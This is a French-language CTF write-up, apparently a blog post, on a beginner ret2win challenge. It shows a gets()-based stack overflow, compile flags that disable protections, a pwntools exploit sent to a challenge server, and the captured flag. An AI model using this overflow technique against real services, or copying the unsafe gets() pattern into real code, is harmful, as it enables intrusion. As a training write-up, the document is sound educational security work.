---
layout: post
title: "Kuiper Belt Relay Core : ret2win"
date: 2026-10-03 16:41:00 +0000
categories: [writeups, pwn]
tags: [ctf, pwn, buffer-overflow, ret2win, pwntools]
author: josias
---

## Présentation

**Kuiper Belt Relay Core** est un challenge Pwn de difficulté débutant. Le programme `echo.c` contient une fonction `win()` qui lit le flag, mais elle n'est jamais appelée.

## Analyse de la vulnérabilité

La fonction `vuln()` utilise `gets()` avec un buffer de 64 octets :

```c
void vuln() {
    char buffer[64];
    gets(buffer);
}
```

L'absence de contrôle de taille permet un **stack buffer overflow**. L'objectif est d'écraser l'adresse de retour pour rediriger l'exécution vers `win()`.

La recompilation locale permet de reproduire l'environnement :

```bash
gcc -fno-stack-protector -no-pie -o echo echo.c -w
objdump -d echo | grep -A1 '<win>:'
```

L'adresse de `win()` est `0x401216` et l'offset entre le début du buffer et l'adresse de retour est de 72 octets.

## Exploit ret2win

```python
from pwn import *

io = remote("34.116.80.78", 9998)
io.recvuntil(b"Enter your message: ")
payload = b"A" * 72 + p64(0x401216)
io.sendline(payload)
print(io.recvall(timeout=3).decode(errors="replace"))
```

Le test local est réalisé avant toute connexion distante afin de confirmer l'offset et la cible.

## Flag

```text
CSSCTF{s1gn4l_r3c0v3d_fr0m_th3_v01d}
```

[Lire le write-up original sur Notion](https://app.notion.com/p/Kuiper-Belt-Relay-Core-Writeup-3eec5eb422c381afa450e14febd5bf91)
